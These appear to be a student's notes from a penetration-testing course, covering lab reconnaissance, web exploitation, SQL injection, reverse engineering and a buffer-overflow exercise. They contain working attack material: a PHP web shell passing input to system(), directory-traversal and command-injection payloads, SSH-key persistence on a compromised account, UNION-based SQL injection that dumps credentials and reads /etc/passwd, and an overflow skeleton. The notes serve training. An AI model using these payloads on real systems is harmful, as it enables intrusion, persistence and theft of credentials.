#Day 1 -- Exploit Research
id
hostname

#operation systems information
cat /etc/os-release
lsb_release -a

#kernel version
uname -a
hostnamectl

exploit-db.com

#Day 1 -- Network Recon

#install python packages
sudo apt-get install python-lxml python-requests python3-pip -y
sudo apt-get install python3-lxml ( or run script with python not python3)

######## web.py ########
import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ',authors)
######## web.py ########

#quotes to scrape
#w3schools.com/html/
#understanding html tags

##altering the script when looking for tags on 2nd page
#change the page vaiable to the updated link
page = requests.get('http://quotes.toscrape.com/page/2/')
#change the author variable 
labels = tree.xpath('//a[@class="tag"]/text()')
#alter print statement too




#Day 1 -- recon/scanning

1. Host Discovery (Ping Sweep)
BASH:  for i in {1..254} ;do (ping -c 1 192.168.65.$i | grep "bytes from" &) ;done

2. Host Enumeration (Port scanning)
nmap -Pn -T5 192.168.65.20 -p-
  -Pn = no host discovery
  -T0 to -T5 = speed
  -p- = scan all pors
  
3. Host Interrogration (service)
nmap -Pn -T5 -sV 192.168.65.20 -p 21-23,80
  -sV  = the service version
   #do not have to banner grab with this
   



#nmap nse
https://nmap.org/book/man-nse.html

#nmap scripts storage in linux
/usr/share/nmap/scripts

nmap --script <filename>|<category>|<directory>
nmap --script-help "ftp-* and discovery"
nmap --script-args <args>
nmap --script-args-file <filename>
nmap --script-help <filename>|<category>|<directory>
nmap --script-trace


#ls /usr/share/nmap/scripts | grep "banner"
nmap -Pn -T5 --script banner.nse 192.168.65.20 -p 21-23,80

nmap -Pn -T5 --script discovery 192.168.65.20 -p 21-23,80

nmap -Pn -T5 --script "discovery or safe" 192.168.65.20 -p 21-23,80

nmap -Pn -T5 --script ftp* 192.168.65.20 -p 21-23,80

======================================================================================================================

#Day 2 -- Web Explotation (Enum/Exploit)

#HTTP request message - request line 
GET / HTTP/1.1
Get = requesting/retrieing
Post = Sending information
(Get <==, Post<==, Put, Head)

/ = top level domain
  www.google.com/
  www.google.com/maps
  (/maps)

HTTP/1.1 = version

#HTTP respnse message - status line
HTTP/1.1 200 OK

HTTP/1.1 = version
200 = 2|00
2 = successful
00 = OK
                                              
404 = 4|04
4 = client error
04 = not found

#list of status codes
https://en.wikipedia.org/wiki/List_of_HTTP_status_codes

ok = message


#Demo - Dev console
Console Tab

Code:
function stuff() {
<code stuff here>
}

stuff ();


#HTML
-HTML = Frame of the webpage / house
-CSS = Drywall/Paint/Templates
-Javascript = Scripts/Functions/Interaction

#image
<img src="shutterstock_246695119_1080.jpg" height="500" width="500"> <br>

#comment
<! Notice anything wrong with the button?  Oh and this is a comment>

javascript = <script></script>

<script>
function myFunction(){
document.getElementById("demo").innerHTML = "Paragraph changed.";} </script>
||
\/
<script> </script> = Javascript
function myFunction() = Defining function, name of function is myFunction
document = Specifies the HTML document
getElementById("demo") = element name id with value of demo
innerHTML = The string between the html tags



<script>
function changeText() {
  x = document.getElementById("mySelect");
  x.options[x.selectedIndex].text = "Melon";
}
</script>

<script></scipt> = javascript HTML tags
function changeText() = function names changeText()
x= vaiable
document = html document
getElementById = Id="mySelect"
x.options = 
  <option>Apple</option>
  <option>Orange</option>
  <option>Pineapple</option>
  <option>Banana</option>
selectedIndex = Select Item



#Web enumeration
1.scanning
cd /usr/share/nmap/scripts/
ls | grep http

http-enum.nse
http-robots.txt.nse

nmap -Pn -T5 --script=http-enum.nse 10.50.41.203 -p 80
results:
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /robots.txt: Robots file
|   /java/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /path/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'

nmap -Pn -T5 --script=http-robots.txt.nse 10.50.41.203 -p 80
results:
PORT   STATE SERVICE
80/tcp open  http
| http-robots.txt: 2 disallowed entries 
|_/cross /

/robots.txt  <== legit
/java/  <== legit
/path/  <== legit
/uploads/  <== legit
/cross /  <== legit

2.robots.txt
http://10.50.41.203/robots.txt

User-agent: *
Allow: /uploads
Allow: /chat
Allow: /cmdinjection
Allow: /java
Allow: /path
Allow: /webexample
Disallow: /cross
Disallow: /


3.legitmite surfing
going to each user agent
and seeing if its legit



#Web Exploitation
1. Directory Traversal - Info
../../../../../../../../../../../../../../etc/passwd

/etc/passwd
/etc/group
/etc/hosts
/etc/networks
/etc/resolv.conf
/etc/os-release

http://10.50.41.203/path/pathdemo.php?myfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&submit=File+look+up
myfile <== parameter
submit <== parameter
    file look up

http://10.50.41.203/path/pathdemo.php
http://10.50.41.203/path/pathdemo.php?
? = Query String Parameters
http://10.50.41.203/path/pathdemo.php?=
http://10.50.41.203/path/pathdemo.php?=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd


2. Command injection - Info/Access
../../../../../../../../../../../../../../etc/passwd
; id
; whoami


3. Web SHell - Info/Access
1. Can you upload? Yes 
2. Is your uploads being sanitized? No
3. Can you access the uploads directory? Yes

##### webshell.php ####
<HTML><BODY>
<Form METHOD="GET" NAME="badform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="hello">
</Form>
<?php system($_GET['cmd']);?>
</BODY></HTML>
##### webshell.php ####

10.50.41.203/

id

2a (CmdInj)/3a (WebShell). SSh keys - Access

1. Determine who the user is
id
who

www-data

2. Determine user's home directory
cat /etc/passwd

www-data:x:33:33:www-data:/var/www:/bin/bash

www-data = user
/var/www = www-data's home directory
/bin/bash = login shell

3. Generate SSH keys from the workstation you will login from
ssh-keygen -t rsa -b 4096
[Enter]
[Y] to Overwrite
[Enter]

cd /home/student/.ssh
ls
id_rsa = private
id_rsa.pub = public   <=== key to be uploaded on target

cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCzc7fGxYzYunC/P7RHhDqSNPC9M8pAk2S8qXQV/LTVvfmapeFrvKpFOWUdgM2ekNbVNESZgFhzg4SFd1IhZuQIj+JrxBDUpu+cz3rr52FV0IWnPQr9hc/c6SIigWYhLVsDvR1i9sPSl+/SaG5FPxnZ+pBpKzaFfsydIWbDUImWe23AgAviRJ8G2IMgFjQxEenJqyNcmO/nKUWlUZN1rX2fzgwM7mTmV8rUs0f+jxKoFi9wTzX0apYhGD7qRTJ9qyDYU5HfuHSi0hcBi5eCDgwFwjgBBG9Gmc8CaoPGeWleV9PkbcuyhxDeNd42l7RLarPI0e5o4xZ3dmu3qq9w621QQd08ys6dltWQspPTy65LRPq8srCrFFHg+RU6tgSYkJRnB12Urf4YtYB0nmDYXDgCpoFpa90sbnWSUl8uPeH1aic1SbGGhFyjDTEtZsrdxHjPRFXn8tOXOrXewCrBGYAQiCKA6kZ9nCTZCpvnHIHOUx9zqzqzScK8MiwSkxvCX4lKXvzZxwjzQSDpEvcEqgZtkgPTve8llkqrYLCZJVux1GaQDgwBngplEuqON6Sq+xDE1xE4KyefCG5OwIZo/oWsrl2E1KFNqaqu+AoiiLhaQJWeVzrDevK9pAJv6ZROo/EQ38KJeHaLOtqDlJyZYWW+gTzrJnjmr7uFeAKDImYk7w== student@lin-ops


4. On target machine, validate directories
Validate .ssh/ exist in the user's home directory
ls -la /var/www
      *ssh directory doesnt exist
mkdir /var/www/.ssh
ls -la /var/www


5. Upload SSH key to authorized_key file
echo "" > /var/www/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCzc7fGxYzYunC/P7RHhDqSNPC9M8pAk2S8qXQV/LTVvfmapeFrvKpFOWUdgM2ekNbVNESZgFhzg4SFd1IhZuQIj+JrxBDUpu+cz3rr52FV0IWnPQr9hc/c6SIigWYhLVsDvR1i9sPSl+/SaG5FPxnZ+pBpKzaFfsydIWbDUImWe23AgAviRJ8G2IMgFjQxEenJqyNcmO/nKUWlUZN1rX2fzgwM7mTmV8rUs0f+jxKoFi9wTzX0apYhGD7qRTJ9qyDYU5HfuHSi0hcBi5eCDgwFwjgBBG9Gmc8CaoPGeWleV9PkbcuyhxDeNd42l7RLarPI0e5o4xZ3dmu3qq9w621QQd08ys6dltWQspPTy65LRPq8srCrFFHg+RU6tgSYkJRnB12Urf4YtYB0nmDYXDgCpoFpa90sbnWSUl8uPeH1aic1SbGGhFyjDTEtZsrdxHjPRFXn8tOXOrXewCrBGYAQiCKA6kZ9nCTZCpvnHIHOUx9zqzqzScK8MiwSkxvCX4lKXvzZxwjzQSDpEvcEqgZtkgPTve8llkqrYLCZJVux1GaQDgwBngplEuqON6Sq+xDE1xE4KyefCG5OwIZo/oWsrl2E1KFNqaqu+AoiiLhaQJWeVzrDevK9pAJv6ZROo/EQ38KJeHaLOtqDlJyZYWW+gTzrJnjmr7uFeAKDImYk7w== student@lin-ops
" >> /var/www/.ssh/authorized_keys

6. Confirm SSH key upload

cat /var/www/.ssh/authorized_keys

7. Login
ssh www-data@10.50.41.203


##Day 3 -- SQL Injections

#standard commands
USE             select the DB you would like to use.
SELECT          extracts data from a database        <===========
UPDATE          updates data in a database
DELETE          deletes data from a database
INSERT INTO     inserts new data into a database
CREATE DATABASE creates a new database
ALTER DATABASE  modifies a database
CREATE TABLE    creates a new table
ALTER TABLE     modifies a table
DROP TABLE      deletes a table
CREATE INDEX    creates an index (search key)
DROP INDEX      deletes an index
UNION           Used to combine the result-set of two or more SELECT statements  <===============

#https://www.w3schools.com/SQl/sql_syntax.asp
 
#going to pair union command with select command


#Demo
mysql 
mysql --user=<username> --pass=<password> #use if you do not have access

#semi colon required at end of command
#show databases on the machine
show databases; 

#default databases
information_schema: Database of database, provides list od all databases, tables, and columns
mysql: mysql user list
performance_schema: metrics of SQL server

#show tables in a database
show tables from information_schema;

#view column in a table from a datbase
select * from session.Tires;

#default SQL statement
select <column> from <database>.<table>;

#select on a certain column
select name,size from session.Tires;

#nesting commands
select * session.Tires; select * from session.car;

#combining/joining commands
select * session.Tires UNION select * from session.car;
#could produce an error if there is a different number of columns
#have to either add or subtract columns from a table

#adding columns to union
select *,1,2 from session.Tires UNION select * from session.car;
select * from session.car UNION select *,null,null from session.Tires;
#took the column name from Tires because it is listed first

#subtract columns to union
select * from session.Tires UNION select carid,name,type,cost from session.car;


#unsanitized vs sanitized
' = to modify backend code that utilized quotation marks
/ = escape character
( or ) = to close off backened code that utilizes this

Gmail
username: Johndoe243
password: paas1234

$name = Johndoe243
$pass = paas1234

#backend code
SELECT id FROM users WHERE name='$name' AND pass='$pass';
SELECT id FROM users WHERE name='JohnDoe243' AND pass='paas1234';

Truth statemenet
<value>' or 1='1

SELECT id FROM users WHERE name='[<value>' or 1='1]' AND pass='$pass';
SELECT id FROM users WHERE name='$name' AND pass='[<value>' or 1='1]';
SELECT id FROM users WHERE name='[<value>' or 1='1]' AND pass='[<value>' or 1='1]';


# = commenting out
<value> or 1='1'; #
SELECT id FROM users WHERE name='[<value>' or 1='1]'; #' or 1='1' AND pass='$pass';



#truth statement demo
<value>' or 1='1
<value>' or 1='1;
<value>' or 1='1; #

1. determine the behavior
username=matt
password=password
#this did not work

2.determine if webpage is vulnerable to SQL injection
username=matt' or 1='1
password=password' or 1='1
#this did work

3.Retrieved/Dump information using Get method
http://10.50.21.1/login.php
http://10.50.21.1/login.php?
? = query string parameters to follow

#### pay attention to the format of the web address ####
http://10.50.21.1/login.php?username=matt'+or+1='1&passwd=password'+or+1='1
#find the field and how they spell them in console tab > network> request after sending the or password



#SQL injection - POST method
#demo on 10.50.21.1/Union.html
0. Determine normalbehavior
Only valid entries will provide information
Toyota = Not valid entry, did not display webpage with data

1. Determine if the webpage is vulnerable via Truth statement
Truth statement
<value>' or 1='1
<value>' or 1='1;
<value>' or 1='1; #

Ford' or 1='1
Ford' or 1='1;
Ford' or 1='1; #

Dodge' or 1='1
Dodge' or 1='1;
Dodge' or 1='1; #

Honda' or 1='1
Honda' or 1='1;
Honda' or 1='1; #

Audi' or 1='1     <=== works
Audi' or 1='1;    <=== works
Audi' or 1='1; #  <=== works

2. Determine the number of columns from the table that the webpage is displaying
#webpage
columns: 4   <=== start with lowest number
rows: 5

Audi' or 1='1     <=== works
Audi' or 1='1;    <=== works
Audi' or 1='1; #  <=== works

Audi' UNION select 1,2,3,4       <==== nope
Audi' UNION select 1,2,3,4;      <==== nope
Audi' UNION select 1,2,3,4; #    <==== nope
#the table has more that 4 columns

#fuze up
Audi' UNION select 1,2,3,4,5       <==== nope
Audi' UNION select 1,2,3,4,5;      <==== nope
Audi' UNION select 1,2,3,4,5; #    <==== works

3. Determine the number of columns, order, and hidden
Audi' UNION select 1,2,3,4,5; #    <==== works        Manufacturer	Cost	Color	Year
                                                           Audi 	  22000  red 2134
                                                             1    	  3 	  4 	  5
columns = 5
order: 1,3,4,5
hidden: 2


4. Extract information via Golden Statement
Golden statement:
select table_schema,table_name,column_name from information_schema.columns; #

information_schema = database, database of information (databasae, tables, and column names)
columns = table, table within information_schema database

table_schema = columns, database names
table_name = columns, table names
column_name = columns, column names


Audi' UNION select 1,2,3,4,5; #    <==== works
#golden statement
Audi' UNION select table_schema,table_name,column_name,1,2 from information_schema.columns; #
#need to add padding because of the difference in number of columns

Audi' UNION select table_schema,table_name,column_name,1,2 from information_schema.columns; #
1             |2          |3          |4  |5
table_schema  table_name  column_name  1  2

Hidden: 2
#since column 2 is hidden, it needs a place holder
Audi' UNION select table_schema,null,table_name,column_name,1 from information_schema.columns; #
1             |2          |3          |4           |5
table_schema  null        table_name  column_name  1  

5. Extracting Desired Information
Audi' UNION select table_schema,null,table_name,column_name,1 from information_schema.columns; #

Database: session
Table: userinfo
columns: studentID, username, passwd

Audi' UNION select table_schema,null,table_name,column_name,1 from information_schema.columns; #

studentID,null,username,passwd,null
session.userinfo

Audi' UNION select studentID,null,username,passwd,null from session.userinfo; #



#SQL injection - GET method
0. Determine the normal behavior
Goodyear
http://10.50.21.1/uniondemo.php?Selection=1&Submit=Submit
Cooper
http://10.50.21.1/uniondemo.php?Selection=2&Submit=Submit
Bridgestone
http://10.50.21.1/uniondemo.php?Selection=3&Submit=Submit
General
http://10.50.21.1/uniondemo.php?Selection=4&Submit=Submit

1. Determine if the webpage is vulnerable via Truth statement
Truth statement
#normally don't need qutoes for GET method
<value> or 1=1
<value> or 1=1;
<value> or 1=1; #

1 Not Vulnerable
http://10.50.21.1/uniondemo.php?Selection=1 or 1=1
http://10.50.21.1/uniondemo.php?Selection=1 or 1=1;
http://10.50.21.1/uniondemo.php?Selection=1 or 1=1; #

2 Vulnerable
http://10.50.21.1/uniondemo.php?Selection=2 or 1=1
http://10.50.21.1/uniondemo.php?Selection=2 or 1=1;
http://10.50.21.1/uniondemo.php?Selection=2 or 1=1; #

3 Vulnerable
http://10.50.21.1/uniondemo.php?Selection=3 or 1=1
http://10.50.21.1/uniondemo.php?Selection=3 or 1=1;
http://10.50.21.1/uniondemo.php?Selection=3 or 1=1; #

4 Vulnerable
http://10.50.21.1/uniondemo.php?Selection=4 or 1=1
http://10.50.21.1/uniondemo.php?Selection=4 or 1=1;
http://10.50.21.1/uniondemo.php?Selection=4 or 1=1; #



2. Determine the number of columns from the table that the webpage is displaying
Webpage
columns: 3  <=== start with lowest number
Rows: 5

http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3
http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3;
http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3; #


3. Determin the number of columns, order, and hidden
Columns: 3
Order: 1,3,2
Hidden: N/A

Backend
1   |2   |3

Webpage
1   |3   |2


4. Extract information via Golden Statement
Golden statement:
select table_schema,table_name,column_name from information_schema.columns; #

information_schema = database, database of information (databasae, tables, and column names)
columns = table, table within information_schema database

table_schema = columns, database names
table_name = columns, table names
column_name = columns, column names

http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3; #
http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,table_name,column_name from information_schema.columns; #
#the coloumns are reversed whne displayed
Backend
1         |2      |3
t_schema  t_name  column_name

Webpage
1         |3           |2
t_schema  column_name  t_name

http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns; #
#flip it to make it readable
Backend
1         |2      |3
t_schema  column_name  t_name

Webpage
1         |3           |2
t_schema  t_name  column_name

5. Extracting Desired Information
http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns; #

Database: session
Table: user
columns: name,pass,id   

http://10.50.21.1/uniondemo.php?Selection=2 UNION select name,id,pass from session.user; #




#version and function and filtering

#version
#@@version
http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3; #
http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,@@version; #
#find the sql version the server is running
#using @@version right after fuze b/c we know that the correct number of columns

#function
#load_file()
http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,load_file('/etc/passwd'); #

#filtering
http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3; #
http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns; #
http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns WHERE table_schema='session'; #


=======================================================================================================================================================

reverse engineering demo #1

r = 64-bit

MEM1:
    mov rax, 2   rax = 2
    mov rbx, 3   rax = 2, rbx = 3
    mov rax, 0   rax = 0, rbx = 3
    jmp MEM2     go to MEM2
MEM2:
    cmp rax, 7   rax = 7, rbx = 12
       result: 7-7 = 0
       (cmp changes flags register)
       flags register:
       zero: ON
       carry: off
       sign: OFF
    je MEM4      condition is meet, go to MEM4
    (jump if equal: if zero flag is on)                 
MEM3:
    mov rbx, 3   rax = 0, rbx = 3
    add rbx, 9   rax = 0, rbx = 12
    add rax, 1   rax = 7, rbx = 12
    jmp MEM2    unconditional jump to MEM 2
MEM4:
    mov rax, 0   rax = 0, rbx = 12
    ret
Clean Exit Code 0
return 0

#there was a loop until the last condition was met that sent us to the exit code




#### my proccess for patching### from ctf

1. loaded the exe
2. search for key
3. go into the function
4. click the if for the success if statement
5. change the JMZ to JZ
6. change the invaled key to say success
7. go to file > export program
8. change format to PE
9. note where the new file will be saved
10. run that shit

========================================================================================================================

## Day7 --Exploit Development

--Static Analysis
file <binaryname>
strings -n 10 <binaryname>

--$ strings -n 10 func | less
Potential Artifacts:  #log any suscpicous items
_IO_stdin_used
     Enter a string: 
/home/student/func.c
getuserinput
     gets@@GLIBC_2.0
crtstuff.c
     puts@@GLIBC_2.0
--$ strings -n 5 func | less
func.c
stddef.h
types.h
libio.h
stdio.h
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0

#research the potential artifacts

--Behavioral Analysis
Enter a string:


--Dynamic Analysis
#use ghidra

#gdb
--$ gdp <binaryname>
gdb-peda$ 

## comment out the source line
vim ~/.gdbinit

#find function
gdb-peda$ disass main
gdb-peda$ pdisass main
-disregard  <__x86.get_pc_thunk.ax>
function:
getuserinput     #custom created function

#look inside the function
gdb-peda$ disass getuserinput
gdb-peda$ pdisass getuserinput
-disregard <__x86.get_pc_thunk.bx>
call   0x3e0 <puts@plt>
call   0x3d0 <gets@plt>

peda plugin = highlighted red, vulnerable function
** This is what peda thinks is vulnerable


##Buffer Overflow
0. Run the program
./func

1. Attempt to buffer overflow the program
https://wiremask.eu/tools/buffer-overflow-pattern-generator/
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
results: Segmentation fault (core dumped)

2. Determine Buffer Overflow Offset
dmesg | tail -n 5
last line in result:
[4109352.932289] func[6730]: segfault at 31634130 ip 0000000031634130 sp 00000000ffffd4d0 error 14 in func[56555000+1000]
  31634130  # plug this into the website above
  62 characters minimum to Buffer overflow

3. validate the offset & craft exploit
###crafted exploit###
###linux_buffer.py###
#!/usr/bin/python

#buffer
Buffer = "A" * 62

#eip (placeholder)
eip = "B" * 4

#nop
nop = "\x90" * 10

#shellcode
print(Buffer + eip + nop)
###crafted exploit###
###linux_buffer.py###

--$ gdb func
gdb-peda$ run <<< $(python linux_buffer.py)


















































































